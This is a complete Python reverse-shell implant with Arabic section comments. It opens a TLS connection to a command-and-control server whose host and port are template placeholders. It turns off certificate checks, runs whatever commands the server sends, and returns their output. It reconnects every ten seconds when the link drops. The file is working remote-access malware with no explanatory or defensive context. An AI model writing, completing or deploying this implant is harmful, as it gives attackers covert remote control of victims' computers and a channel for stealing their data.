import socket
import ssl
import subprocess
import os
import sys
import time

# ==============================
# إعدادات الاتصال الديناميكية
# ==============================
C2_HOST = "{{C2_HOST}}"
C2_PORT = {{C2_PORT}}

# ==============================
# تنفيذ الأوامر
# ==============================
def execute_command(conn, command):
    try:
        proc = subprocess.run(command.split(), capture_output=True, text=True, timeout=10)
        output = proc.stdout + proc.stderr
    except Exception as e:
        output = str(e)
    conn.send(output.encode())

# ==============================
# الاتصال العكسي المشفر
# ==============================
def connect_to_c2():
    while True:
        try:
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.create_connection((C2_HOST, C2_PORT))
            ssock = context.wrap_socket(sock, server_hostname=C2_HOST)

            ssock.send(f"[+] Connected: {os.name} Device".encode())

            while True:
                try:
                    cmd = ssock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    if cmd.lower() in ['exit', 'quit']:
                        ssock.close()
                        break
                    execute_command(ssock, cmd)
                except:
                    ssock.close()
                    break
        except:
            time.sleep(10)

# ==============================
# نقطة الدخول
# ==============================
if __name__ == "__main__":
    connect_to_c2()